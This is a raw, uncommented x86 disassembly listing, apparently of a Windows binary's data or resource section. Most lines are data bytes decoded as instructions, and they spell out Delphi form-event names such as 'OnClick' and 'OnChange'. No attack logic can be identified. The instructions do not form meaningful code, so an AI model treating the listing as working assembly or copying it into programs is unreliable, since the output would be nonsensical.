inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ esi + eax + 0x44 ] ah
add al bh
or al 0x44
add [ eax + 0x7000441a ] bl
cmp [ ebx ] al
adc [ edi ] 0x44
add ah dl
cmp [ ebx ] al
xor [ ebx ] bl
inc esp
add [ ebx + ebx ] dh
inc esp
add [ edx + ebp + 0x3a140043 ] bl
inc ebx
add [ esi + eax * 2 ] cl
inc esp
add ah bl
and eax [ eax + eax ]
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add ah cl
inc ebx
add [ ebx + ebp + 0x43 ] cl
add [ eax + 0x2b ] bh
inc ebx
add al ah
inc ebx
add [ eax + 0x2a ] dh
inc ebx
add [ eax ] cl
inc ebx
add [ esi + esi ] dl
inc ebx
add [ eax - 0x1fffbcca ] ah
xchg ebp eax
inc esp
add al al
sub al [ ebx ]
sub [ 0x2df00043 ] dh
inc ebx
add [ ebx + eax * 2 ] ch
inc ebx
add [ eax + edi + 0x43 ] cl
add ah dh
sub eax [ ebx ]
and [ ebx + 0x43 ] al
add al bl
inc ebx
add ah ah
xor eax 0x336c0043
inc ebx
add [ ecx + eax * 2 ] bh
inc ebx
add [ eax + edi ] cl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2700040 ] dl
add [ eax ] al
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx + 0x64ffba00 ]
cmp al [ ebx ]
pushfd
sub al 0x43
add [ ecx + eax * 2 + 0x43 ] bl
add [ edx + eax * 2 ] dh
inc ebx
add [ eax + 0x42 ] ah
inc ebx
add [ ebx + eax * 2 ] dh
inc ebx
add [ ebp + eax * 2 + 0x43 ] ch
add [ ebx + edi + 0x540f0043 ] ch
inc ebx
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] bh
aaa
inc ebx
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ecx
insb
jae r-xdata
jo r-xdata
je r-xdata
add [ eax + r-xdata ] dl
add ecx [ esi ]
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
shr ah 0xdf
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
mov esp 0x10004337
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc eax
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
jb r-xdata
je r-xdata
sbb [ eax + eax + 0x34 ] eax
add [ eax - 0x1f ] ah
inc edx
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x42d80043 ] cl
inc ebx
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ esi + eax + 0x44 ] ah
add al bh
or al 0x44
add [ eax + 0x7000441a ] bl
cmp [ ebx ] al
adc [ edi ] 0x44
add ah dl
cmp [ ebx ] al
xor [ ebx ] bl
inc esp
add [ ebx + ebx ] dh
inc esp
add [ edx + ebp + 0x3a140043 ] bl
mov eax [ 0x34fc0041 ]
loope r-xdata
inc ebx
add al cl
popad
bound ebp [ ebp + 0x8 ]
add [ eax ] al
add [ eax ] al
add [ edx ] bl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
sub al 0xdf
inc edx
add [ edx ] cl
arpl [ ebx + 0x44 ] si
jb r-xdata
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ecx + 0x42 ] cl
inc ebx
add [ esi + eax * 2 ] cl
inc esp
add ah bl
and eax [ eax + eax ]
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add ah cl
inc ebx
add [ ebx + ebp + 0x43 ] cl
add [ eax + 0x2b ] bh
inc ebx
add al ah
inc ebx
add [ eax + 0x2a ] dh
inc ebx
add [ eax ] cl
inc ebx
add [ esi + esi ] dl
inc ebx
add [ eax - 0x1fffbcca ] ah
xchg ebp eax
inc esp
add al al
sub al [ ebx ]
sub [ 0x2df00043 ] dh
inc ebx
add [ ebx + eax * 2 ] ch
inc ebx
add [ eax + edi + 0x43 ] cl
add ah dh
sub eax [ ebx ]
and [ ebx + 0x43 ] al
add al bl
inc ebx
add ah ah
xor eax 0x336c0043
inc ebx
rol [ eax ] 0xe3
inc edx
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] edx
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
loop r-xdata
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ edx + eax - 0x22b80000 ] dl
inc edx
add [ eax + ebp * 4 + 0x41 ] dl
inc edx
jo r-xdata
add [ ecx + eax * 2 ] bh
inc ebx
add [ eax + edi ] cl
inc ebx
add [ ecx ] cl
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
in al 0x35
inc ebx
add [ ebx + esi + 0x43 ] ch
loope r-xdata
add [ ebp + 0x41 ] dl
fild [ ebx ]
insb
test al 0x41
add [ eax + 0x21 ] dh
add [ eax - 0x5ffffffe ] bl
fild [ edx ]
push esp
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
inc ecx
add [ eax + 0x34 ] cl
inc ebx
add [ esp + eax * 2 ] dh
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
outsd
ja r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx + 0x42 ] bl
add [ ebp ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
fild [ edx ]
add al 0xdf
inc edx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
add [ eax ] al
dec eax
fld [ edx ]
push esp
test al 0x41
or [ ebx + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x630e656c
jae r-xdata
dec ecx
outsb
outsb
outsd
inc esp
jb r-xdata
insb
outsd
jae r-xdata
insb
jae r-xdata
add al cl
rol [ ebx ] cl
in al dx
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] cl
jb r-xdata
add [ eax ] al
str [ edx ]
0x1650043 0xff00
adc [ ebx + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or [ edx + 0x65 ] eax
jbe r-xdata
insb
jo r-xdata
add [ ecx ] cl
inc edx
jbe r-xdata
push ebp
jo r-xdata
or al 0x0
or al 0x41
jne r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
or al 0x41
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] bh
aaa
inc ebx
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
push esp
movsd [ edi ] [ esi ]
inc ecx
insb
jae r-xdata
xor al 0x40
inc ecx
add ah bh
jo r-xdata
add [ eax ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
inc edx
outsd
ja r-xdata
outsb
0x1620043 0xff00
push eax
push ebx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
insb
outsd
inc ebx
outsd
insd
jo r-xdata
add [ ebx + 0x42e1d4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jecxz r-xdata
loope r-xdata
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
js r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0xd90c6564
inc edx
add [ edx + eax ] dh
insb
dec edi
jne r-xdata
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebp
jae r-xdata
insb
jb r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410b00
je r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
insb
inc ebx
add [ fs : eax ] eax
dec [ ebx + edx * 2 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
inc edx
jbe r-xdata
0x1630043 0xff00
or al 0x53
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] cl
add [ edx ] cl
jbe r-xdata
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] dh
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x4f736310
ja r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
cmp al 0x10
jb r-xdata
add [ eax ] al
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax ] al
jb r-xdata
push cs
add [ edx ] cl
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
push esp
xor al [ eax ]
mov esp 0x10004337
jb r-xdata
add bh bh
mov [ ecx ] al
inc ebx
outsd
jne r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
inc edi
inc esp
add [ edi + eax * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
adc eax 0x68430800
popad
jb r-xdata
fsubr [ 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
fld [ edx ]
je r-xdata
add dh bh
sbb al 0xdf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
jae r-xdata
rol [ ebx ] 0x1
add [ eax ] al
add [ eax + 0x3 ] al
adc eax [ eax ]
pop es
fild [ edx ]
jbe r-xdata
loope r-xdata
jb r-xdata
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40103c74
add ah cl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add ah bh
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
je r-xdata
inc eax
add [ eax ] dl
add al [ eax ]
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
cmp al 0x10
xor eax [ eax + edi * 2 - 0x7c ]
inc esp
js r-xdata
push 0x700041b7
add [ eax ] al
[ eax - 0x4bffbc21 ]
fild [ ebx ]
add [ eax ] al
add [ eax - 0xfffffb ] al
push ss
add [ 0x6f6c6f43 ] al
jb r-xdata
adc al [ eax ]
add eax 0x6c797453
mov eax 0x6100438b
add [ eax ] al
dec [ ecx + edx * 8 + 0x43 ]
add al ch
sbb [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
jo r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
jb r-xdata
mov [ ebx ] es
je r-xdata
add ah ch
inc esp
add [ eax ] bh
xor al [ eax ]
imul edi [ eax + 0x65 ] 0x73631364
dec edi
ja r-xdata
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jae r-xdata
add [ eax ] al
sbb al 0x0
or eax 0x706f7244
inc esp
outsd
ja r-xdata
or [ eax ] al
inc ebx
jne r-xdata
add bh bh
in al 0x2
inc esp
add [ ecx ] al
inc esp
inc ecx
add [ eax + 0x34 ] cl
jb r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax + ecx * 2 ]
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc ecx
jb r-xdata
clc
aaa
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
dec eax
jo r-xdata
adc [ eax ] al
0x6cff0000 0x43df
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
add [ edx ] bl
add [ eax ] cl
inc esp
jb r-xdata
mov eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ecx
inc esp
add [ eax ] bh
ja r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
adc eax [ ecx ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
rcl [ ebx ] 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
dec eax
mov eax [ ebx ]
xchg esp eax
inc edi
inc esp
add [ eax + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
add [ eax ] al
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
add [ eax ] al
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and al 0xdf
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + eax * 2 + 0x6800 ] bh
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
popad
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
add al [ eax ]
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x10043dd ]
sub_42e7f2
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
rcl [ gs : bp + di ] 0x41
mov eax [ ebx ]
clc
fld [ ebx ]
sub dh bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
sbb ch bl
inc ebx
add [ esi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xc0656c62
adc eax [ ecx ]
sbb [ edx ] al
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
rcl [ ebx ] 0x41
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
outsb
xchg esp eax
inc ebx
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
rcl [ ebx ] 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
rcl [ bp + di ] 0x41
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
inc ebx
insb
outsd
jae r-xdata
xor al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
mov es [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
fild [ fs : edx ]
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
outsb
inc ebp
js r-xdata
push es
dec edi
lea eax [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
mov al 0x8f
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
inc [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
add al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xec
inc edx
add [ eax + eax ] ch
add [ eax ] al
mov al 0x98
jb r-xdata
outsb
dec ebx
jns r-xdata
fild [ edx ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ 0x654d6e4f ] cl
popad
jae r-xdata
insd
rcl [ ebx ] 0x41
inc esp
mov es [ ebx ]
loopne r-xdata
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
inc ecx
jb r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ ecx ]
outsb
dec edi
add [ edx ] 0x0
fild [ edx ]
outsd
arpl [ ebx - 0x50 ] bp
pop [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or [ edi + 0x6e ] ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941e90b
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
adc eax [ ecx ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or cl [ edi + 0x6e ]
inc ebx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
cwde
inc esp
outsd
arpl [ ebx + 0x68 ] bp
pop [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
rcr [ 0x23c0041 ] 0x1
jb r-xdata
jmp eax
add bh bh
loopne r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
outsb
dec edi
insd
rcl [ ebx ] 0x41
add [ eax ] ch
add al [ eax ]
[ eax ]
add al dh
xor al 0x40
inc eax
jb r-xdata
arpl [ gs : eax + esi * 2 - 0x6f ] si
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
nop
jmp r-xdata
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] cl
dec edi
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
clc
lea eax [ ebx ]
call 0xffffffffe941ea74
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
add [ ecx + ebp * 4 + 0x41 ] dh
add [ ebp + ecx * 8 + 0x43 ] bl
add [ eax + 0x80041a9 ] ch
into
inc ebx
add al bh
test al 0x41
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
add [ eax - 0x34 ] cl
inc ebx
add [ ebp + eax * 2 - 0x3343ffbd ] dl
inc ebx
add [ esp + 0x44 ] cl
add [ ebx + eax ] dl
inc esp
add [ esi + ecx * 8 ] dh
inc ebx
add al dh
int3
inc esp
jb r-xdata
xor al [ eax ]
inc eax
test eax 0x45700041
inc ebx
dec edi
outsb
push ebx
je r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
rcr [ di ] 0x1
inc ecx
add [ edx + eax ] bh
sub_42eb48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0xec
inc edx
add [ eax + eax ] ch
add [ eax ] al
mov al 0x98
inc ebx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
test eax 0x45700041
inc ebx
add [ ecx + ebp * 4 + 0x41 ] dh
add [ ebp + ecx * 8 + 0x43 ] bl
add [ eax + 0x80041a9 ] ch
into
inc ebx
add al bh
test al 0x41
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
add [ eax - 0x34 ] cl
inc ebx
add [ ebp + eax * 2 - 0x3343ffbd ] dl
inc ebx
add [ esp + 0x44 ] cl
add [ ebx + eax ] dl
inc esp
add [ esi + ecx * 8 ] dh
inc ebx
add al dh
int3
sub_42f468
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
cmc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x65ffbd0b ] al
cmc
inc edx
add [ edx + eax ] dl
add [ eax ] al
and ah ch
inc edx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
add al 0x44
add [ eax ] dl
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add ah cl
inc [ ebx ]
enter 0x43d2 0x0
in al dx
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x4b ] ah
inc ebx
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x46fc0043 ] cl
inc ebx
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ esi + eax + 0x44 ] ah
add al bh
or al 0x44
add [ eax + 0x5000441a ] bl
dec ebp
inc ebx
add [ eax - 0x57ffbbe9 ] al
dec ebp
inc ebx
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add ah bl
and eax [ eax + eax ]
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add al al
dec ebx
inc ebx
add ah al
dec esp
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xd4ff
sub_42f58b
dec ebp
inc ebx
add ah bl
dec ebp
inc ebx
add [ eax + 0x4e ] ah
